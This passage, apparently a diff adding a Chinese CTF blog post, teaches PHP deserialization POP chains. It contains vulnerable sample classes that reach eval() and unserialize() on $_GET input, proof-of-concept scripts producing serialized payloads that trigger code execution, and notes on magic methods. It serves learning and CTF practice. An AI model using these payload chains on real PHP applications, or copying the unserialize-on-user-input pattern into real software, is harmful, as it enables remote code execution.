+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">errorr1</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">errorr1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">errorr2</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">errorr0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">var</span><span class="o">=</span><span class="k">new</span> <span class="nx">errorr2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">var</span><span class="o">-&gt;</span><span class="na">data</span><span class="o">=</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>	<span class="c1">//O:7:&#34;errorr0&#34;:1:{s:3:&#34;var&#34;;O:7:&#34;errorr2&#34;:1:{s:4:&#34;data&#34;;s:10:&#34;phpinfo();&#34;;}}
+</span></span></span><span class="line"><span class="cl"><span class="c1">//`errorr2::func()`-&gt;`errorr0::__destruct()`-&gt;`errorr0::__construct`
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>但是这样会报错。</p>
+<p><img loading="lazy" src="https://raw.githubusercontent.com/killdayu/killdayu.github.io_file/main/pictures/20220721133207.png" alt=""  />
+</p>
+<p>因为class里面的属性不是public。我们更改一下class的属性</p>
+<p><img loading="lazy" src="https://raw.githubusercontent.com/killdayu/killdayu.github.io_file/main/pictures/20220721134633.png" alt=""  />
+</p>
+<p>成功rce。但是我们如何在不修改class的属性下进行更改呢？这个时候就需要利用构造函数以及在内部修改。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//error_reporting(0);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">errorr0</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">errorr2</span><span class="p">();</span>	<span class="c1">//errorr1-&gt;errorr2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">errorr1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">errorr2</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>	<span class="c1">//$data-&gt;&#39;phpinfo();&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="nf">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">errorr0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// $a-&gt;var=new errorr2;
+</span></span></span><span class="line"><span class="cl"><span class="c1">// $a-&gt;var-&gt;data=&#39;phpinfo();&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>	<span class="c1">//O:7:&#34;errorr0&#34;:1:{s:6:&#34;*var&#34;;O:7:&#34;errorr2&#34;:1:{s:13:&#34;errorr2data&#34;;s:10:&#34;phpinfo();&#34;;}}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>	<span class="c1">//errorr0 Object ( [var:protected] =&gt; errorr2 Object ( [data:errorr2:private] =&gt; phpinfo(); ) )
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>	<span class="c1">//可以看见$a class的属性也打印出来了
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>	<span class="c1">//由于有private和protected属性，所以存在不可见字符（%00）需要url编码。
+</span></span></span><span class="line"><span class="cl"><span class="c1">//`errorr2::func()`-&gt;`errorr0::__destruct()`-&gt;`errorr0::__construct`
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><img loading="lazy" src="https://raw.githubusercontent.com/killdayu/killdayu.github.io_file/main/pictures/20220721134229.png" alt=""  />
+</p>
+<p>对比一下poc的差异</p>
+<pre tabindex="0"><code>print_r
+1.	errorr0 Object ( [var] =&gt; errorr2 Object ( [data] =&gt; phpinfo(); ) )
+2.	errorr0 Object ( [var:protected] =&gt; errorr2 Object ( [data:errorr2:private] =&gt; phpinfo(); ) )
+反序列化
+1.	O:7:&#34;errorr0&#34;:1:{s:3:&#34;var&#34;;O:7:&#34;errorr2&#34;:1:{s:4:&#34;data&#34;;s:10:&#34;phpinfo();&#34;;}}
+2.	O:7:&#34;errorr0&#34;:1:{s:6:&#34;*var&#34;;O:7:&#34;errorr2&#34;:1:{s:13:&#34;errorr2data&#34;;s:10:&#34;phpinfo();&#34;;}}
+</code></pre><h2 id="test">test<a hidden class="anchor" aria-hidden="true" href="#test">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">//error_reporting(0);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w44m</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$admin</span> <span class="o">=</span> <span class="s1">&#39;aaa&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$passwd</span> <span class="o">=</span> <span class="s1">&#39;123456&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">Getflag</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">===</span> <span class="s1">&#39;w44m&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">===</span><span class="s1">&#39;08067&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;nono&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w22m</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$w00m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">w00m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w33m</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$w00m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$w22m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">w00m</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">w22m</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nv">$w00m</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;w00m&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$w00m</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>反向构造pop链，<code>w44m::Getflag()</code>-&gt;<code>w33m::__toString()</code>-&gt;<code>w22m::__destruct()</code></p>
+<h3 id="poc-1">poc<a hidden class="anchor" aria-hidden="true" href="#poc-1">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1">//error_reporting(0);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w44m</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$admin</span> <span class="o">=</span> <span class="s1">&#39;w44m&#39;</span><span class="p">;</span>	<span class="c1">//手动改一下
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">protected</span> <span class="nv">$passwd</span> <span class="o">=</span> <span class="s1">&#39;08067&#39;</span><span class="p">;</span>	<span class="c1">//手动改一下
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">Getflag</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">===</span> <span class="s1">&#39;w44m&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">===</span><span class="s1">&#39;08067&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;nono&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w22m</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$w00m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">w00m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w33m</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$w00m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$w22m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;w33m __toString&#34;</span><span class="o">.</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">w00m</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">w22m</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">w22m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">w00m</span><span class="o">=</span><span class="k">new</span> <span class="nx">w33m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">w00m</span><span class="o">-&gt;</span><span class="na">w00m</span><span class="o">=</span><span class="k">new</span> <span class="nx">w44m</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">w00m</span><span class="o">-&gt;</span><span class="na">w22m</span><span class="o">=</span><span class="s1">&#39;Getflag&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>	<span class="c1">//w22m Object ( [w00m] =&gt; w33m Object ( [w00m] =&gt; w44m Object ( [admin:w44m:private] =&gt; w44m [passwd:protected] =&gt; 08067 ) [w22m] =&gt; Getflag ) )
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//`w44m::Getflag()`-&gt;`w33m::__toString()`-&gt;`w22m::__destruct()`
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><img loading="lazy" src="https://raw.githubusercontent.com/killdayu/killdayu.github.io_file/main/pictures/20220721141006.png" alt=""  />
+</p>
+<h2 id="ctf">ctf<a hidden class="anchor" aria-hidden="true" href="#ctf">#</a></h2>
+<p>先学习一些tips。</p>
+<h3 id="tips">tips<a hidden class="anchor" aria-hidden="true" href="#tips">#</a></h3>
+<h4 id="__get">__get()<a hidden class="anchor" aria-hidden="true" href="#__get">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>	<span class="c1">//test2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>当访问一个不存在的变量时，变量名会传递给<code>__get()</code>。</p>
+<h4 id="__call">__call()<a hidden class="anchor" aria-hidden="true" href="#__call">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="nv">$c</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>	<span class="c1">//test3
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">print_r</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>	<span class="c1">//Array ( [0] =&gt; test4 )
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">test3</span><span class="p">(</span><span class="nx">test4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>当访问一个不存在的函数时，函数名和实参会被传递给<code>__call()</code></p>
+<h4 id="call_user_func">call_user_func()<a hidden class="anchor" aria-hidden="true" href="#call_user_func">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">hello</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hello &#34;</span><span class="o">.</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nx">hello</span><span class="p">,</span><span class="nx">dayu</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">hello1</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;hello &#34;</span><span class="o">.</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">([</span><span class="nx">A</span><span class="p">,</span> <span class="nx">hello1</span><span class="p">],</span> <span class="nx">dayu1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>call_user_func(函数, 参数)</p>
+<p>call_user_func([类, 方法], 参数)</p>
+<h4 id="array_walk">array_walk()<a hidden class="anchor" aria-hidden="true" href="#array_walk">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">myfunction</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$key</span><span class="s2"> </span><span class="si">$p</span><span class="s2"> </span><span class="si">$value</span><span class="s2">&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;red&#34;</span><span class="p">,</span><span class="s2">&#34;b&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;green&#34;</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;blue&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">array_walk</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="s2">&#34;myfunction&#34;</span><span class="p">,</span><span class="s2">&#34;has the value&#34;</span><span class="p">);</span>	<span class="c1">//array_walk(array,myfunction,parameter...)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>array_walk(数组, 函数, 另外一个参数)</p>
+<h4 id="gc">gc<a hidden class="anchor" aria-hidden="true" href="#gc">#</a></h4>
+<p>tmp</p>
+<h3 id="code">code<a hidden class="anchor" aria-hidden="true" href="#code">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * @Author: F10wers_13eiCheng
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * @Date:   2022-02-01 11:25:02
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * @Last Modified by:   F10wers_13eiCheng
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * @Last Modified time: 2022-02-07 15:08:18
+</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;./HappyYear.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
